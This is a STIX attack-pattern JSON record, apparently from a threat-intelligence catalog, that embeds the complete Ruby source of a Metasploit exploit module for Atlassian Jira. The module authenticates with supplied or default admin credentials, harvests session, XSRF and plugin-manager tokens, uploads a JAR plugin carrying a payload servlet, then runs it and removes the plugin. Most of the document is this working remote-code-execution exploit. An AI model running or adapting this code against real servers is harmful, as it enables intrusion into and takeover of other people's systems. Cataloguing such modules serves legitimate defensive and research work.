{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b539a55a-6150-4d72-a55d-0f461ccc908e",
    "created": "2024-08-14T17:09:55.942543Z",
    "modified": "2024-08-14T17:09:55.942547Z",
    "name": "Atlassian Jira Authenticated Upload Code Execution",
    "description": " This module can be used to execute a payload on Atlassian Jira via the Universal Plugin Manager(UPM). The module requires valid login credentials to an account that has access to the plugin manager. The payload is uploaded as a JAR archive containing a servlet using a POST request against the UPM component. The check command will test the validity of user supplied credentials and test for access to the plugin manager. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/jira_plugin_upload.rb",
            "external_id": "jira_plugin_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/"
        },
        {
            "source_name": "reference",
            "url": "https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-linux-or-mac-system/"
        },
        {
            "source_name": "reference",
            "url": "https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Atlassian Jira Authenticated Upload Code Execution',\n      'Description' => %q{\n        This module can be used to execute a payload on Atlassian Jira via\n        the Universal Plugin Manager(UPM). The module requires valid login\n        credentials to an account that has access to the plugin manager.\n        The payload is uploaded as a JAR archive containing a servlet using\n        a POST request against the UPM component. The check command will\n        test the validity of user supplied credentials and test for access\n        to the plugin manager.\n      },\n      'Author'      => 'Alexander Gonzalez(dubfr33)',\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['URL', 'https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/'],\n          ['URL', 'https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-linux-or-mac-system/'],\n          ['URL', 'https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/']\n        ],\n      'Platform'    => %w[java],\n      'Targets'     =>\n        [\n          ['Java Universal',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2018-02-22'))\n\n    register_options(\n      [\n        Opt::RPORT(2990),\n        OptString.new('HttpUsername', [true, 'The username to authenticate as', 'admin']),\n        OptString.new('HttpPassword', [true, 'The password for the specified username', 'admin']),\n        OptString.new('TARGETURI', [true, 'The base URI to Jira', '/jira/'])\n      ])\n  end\n\n  def check\n    login_res = query_login\n    if login_res.nil?\n      vprint_error('Unable to access the web application!')\n      return CheckCode::Unknown\n    end\n    return CheckCode::Unknown unless login_res.code == 200\n    @session_id = get_sid(login_res)\n    @xsrf_token = login_res.get_html_document.at('meta[@id=\"atlassian-token\"]')\n    return CheckCode::Unknown if @xsrf_token.nil? || @xsrf_token['content'].nil?\n    @xsrf_token = @xsrf_token['content']\n\n    auth_res = do_auth\n    good_sid = get_sid(auth_res)\n    good_cookie = \"atlassian.xsrf.token=#{@xsrf_token}; #{good_sid}\"\n    res = query_upm(good_cookie)\n    if res.nil?\n      vprint_error('Unable to access the web application!')\n      return CheckCode::Unknown\n    elsif res.code == 200\n      return Exploit::CheckCode::Appears\n    else\n      vprint_status('Something went wrong, make sure host is up and options are correct!')\n      vprint_status(\"HTTP Response Code: #{res.code}\")\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    unless access_login?\n      fail_with(Failure::Unknown, 'Unable to access the web application!')\n    end\n    print_status('Retrieving Session ID and XSRF token...')\n    auth_res = do_auth\n    good_sid = get_sid(auth_res)\n    good_cookie = \"atlassian.xsrf.token=#{@xsrf_token}; #{good_sid}\"\n    res = query_for_upm_token(good_cookie)\n    if res.nil?\n      fail_with(Failure::Unknown, 'Unable to retrieve UPM token!')\n    end\n    upm_token = res.headers['upm-token']\n    upload_exec(upm_token, good_cookie)\n  end\n\n  # Upload, execute, and remove servlet\n  def upload_exec(upm_token, good_cookie)\n    contents = ''\n    name = Rex::Text.rand_text_alpha(8..12)\n\n    atlassian_plugin_xml = %Q{\n    <atlassian-plugin name=\"#{name}\" key=\"#{name}\" plugins-version=\"2\">\n    <plugin-info>\n        <description></description>\n        <version>1.0</version>\n        <vendor name=\"\" url=\"\" />\n\n        <param name=\"post.install.url\">/plugins/servlet/metasploit/PayloadServlet</param>\n        <param name=\"post.upgrade.url\">/plugins/servlet/metasploit/PayloadServlet</param>\n\n    </plugin-info>\n\n    <servlet name=\"#{name}\" key=\"metasploit.PayloadServlet\" class=\"metasploit.PayloadServlet\">\n        <description>\"#{name}\"</description>\n        <url-pattern>/metasploit/PayloadServlet</url-pattern>\n    </servlet>\n\n    </atlassian-plugin>\n    }\n\n    # Generates .jar file for upload\n    zip = payload.encoded_jar\n    zip.add_file('atlassian-plugin.xml', atlassian_plugin_xml)\n\n    servlet = MetasploitPayloads.read('java', '/metasploit', 'PayloadServlet.class')\n    zip.add_file('/metasploit/PayloadServlet.class', servlet)\n\n    contents = zip.pack\n\n    boundary = rand_text_numeric(27)\n\n    data = \"--#{boundary}\\r\\nContent-Disposition: form-data; name=\\\"plugin\\\"; \"\n    data << \"filename=\\\"#{name}.jar\\\"\\r\\nContent-Type: application/x-java-archive\\r\\n\\r\\n\"\n    data << contents\n    data << \"\\r\\n--#{boundary}--\"\n\n    print_status(\"Attempting to upload #{name}\")\n    res = send_request_cgi({\n      'uri'            => normalize_uri(target_uri.path, 'rest/plugins/1.0/'),\n      'vars_get'       =>\n        {\n          'token'      => \"#{upm_token}\"\n        },\n      'method'         => 'POST',\n      'data'           => data,\n      'headers'        =>\n        {\n          'Content-Type' => 'multipart/form-data; boundary=' + boundary,\n          'Cookie'       => good_cookie.to_s\n        }\n    }, 25)\n\n    unless res && res.code == 202\n      print_status(\"Error uploading #{name}\")\n      print_status(\"HTTP Response Code: #{res.code}\")\n      print_status(\"Server Response: #{res.body}\")\n      return\n    end\n\n    print_status(\"Successfully uploaded #{name}\")\n    print_status(\"Executing #{name}\")\n    Rex::ThreadSafe.sleep(3)\n    send_request_cgi({\n      'uri'          => normalize_uri(target_uri.path.to_s, 'plugins/servlet/metasploit/PayloadServlet'),\n      'method'       => 'GET',\n      'cookie'       => good_cookie.to_s\n    })\n\n    print_status(\"Deleting #{name}\")\n    send_request_cgi({\n      'uri'          => normalize_uri(target_uri.path.to_s, \"rest/plugins/1.0/#{name}-key\"),\n      'method'       => 'DELETE',\n      'cookie'       => good_cookie.to_s\n    })\n  end\n\n  def access_login?\n    res = query_login\n    if res.nil?\n      fail_with(Failure::Unknown, 'Unable to access the web application!')\n    end\n    return false unless res && res.code == 200\n    @session_id = get_sid(res)\n    @xsrf_token = res.get_html_document.at('meta[@id=\"atlassian-token\"]')\n    return false if @xsrf_token.nil? || @xsrf_token['content'].nil?\n\n    @xsrf_token = @xsrf_token['content']\n    return true\n  end\n\n  # Sends GET request to login page so the HTTP response can be used\n  def query_login\n    send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, 'login.jsp'))\n  end\n\n  # Queries plugin manager to verify access\n  def query_upm(good_cookie)\n    send_request_cgi({\n      'uri'          => normalize_uri(target_uri.path.to_s, 'plugins/servlet/upm'),\n      'method'       => 'GET',\n      'cookie'       => good_cookie.to_s\n    })\n  end\n\n  # Queries API for response containing upm_token\n  def query_for_upm_token(good_cookie)\n    send_request_cgi({\n      'uri'          => normalize_uri(target_uri.path.to_s, 'rest/plugins/1.0/'),\n      'method'       => 'GET',\n      'cookie'       => good_cookie.to_s\n    })\n  end\n\n  # Authenticates to webapp with user supplied credentials\n  def do_auth\n    send_request_cgi({\n      'uri'              => normalize_uri(target_uri.path.to_s, 'login.jsp'),\n      'method'           => 'POST',\n      'cookie'           => \"atlassian.xsrf.token=#{@xsrf_token}; #{@session_id}\",\n      'vars_post'        => {\n        'os_username'    => datastore['HttpUsername'],\n        'os_password'    => datastore['HttpPassword'],\n        'os_destination' => '',\n        'user_role'      => '',\n        'atl_token'      => '',\n        'login'          => 'Log+In'\n      }\n    })\n  end\n\n  # Finds SID from HTTP response headers\n  def get_sid(res)\n    if res.nil?\n      return '' if res.blank?\n    end\n    res.get_cookies.scan(/(JSESSIONID=\\w+);*/).flatten[0] || ''\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-02-22",
    "x_mitre_platforms": [
        "java"
    ]
}